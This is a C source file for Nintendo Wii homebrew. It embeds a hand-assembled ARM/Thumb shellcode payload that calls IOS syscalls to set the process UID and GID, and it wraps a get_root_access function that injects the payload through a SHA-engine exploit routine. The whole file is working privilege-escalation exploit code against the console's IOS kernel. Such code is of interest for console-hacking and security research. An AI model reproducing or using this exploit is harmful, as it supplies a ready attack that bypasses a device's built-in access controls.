#include <stdio.h>
#include <unistd.h>
#include <ogc/cache.h>

#include "superuser.h"
#include "common.h"
#include "sha.h"

static const uint8_t superuser_payload[] = {
    // .thumb
    // _start:
    0xb5, 0x10, // push {r4, lr}
    0x00, 0x04, // movs r4, r0
    0x21, 0x00, // movs r1, #0
    0x20, 0x0f, // movs r0, #15
    0xf0, 0x00, 0xe8, 0x0c, // blx OSSetUID
    0x21, 0x00, // movs r1, #0
    0x20, 0x0f, // movs r0, #15
    0xf0, 0x00, 0xe8, 0x0c, // bls OSSetGID
    0x23, 0x01, // movs r3, #1
    0x21, 0x04, // movs r1, #4
    0x00, 0x20, // movs r0, r4
    0x60, 0x23, // str r3, [r4, #0]
    0xf0, 0x00, 0xe8, 0x0a, // blx OSDCFlushRange
    0xbd, 0x10, // pop {r4, pc}
    // .align 2
    0x00, 0x00, // movs r0, r0
    // .arm
    // OSSetUID:
    0xe6, 0x00, 0x05, 0x70, // ios_syscall 0x2b
    0xe1, 0x2f, 0xff, 0x1e, // bx lr
    // OSSetGID:
    0xe6, 0x00, 0x05, 0xb0, // ios_syscall 0x2d
    0xe1, 0x2f, 0xff, 0x1e, // bx lr
    // OSDCFlushRange:
    0xe6, 0x00, 0x08, 0x10, // ios_syscall 0x40
    0xe1, 0x2f, 0xff, 0x1e, // bx lr
};

static uint32_t dumb_stack[64];
static volatile int signal = 0;

bool get_root_access(void) {
    int ret = do_sha_exploit(superuser_payload, true, (void *)&signal, dumb_stack, sizeof dumb_stack, 0x7F, 0);
    if (ret > 0) {
        while (!signal) {
            usleep(100);
            DCInvalidateRange((void *)&signal, sizeof(int));
        }

        return true;
    }

    return false;
}
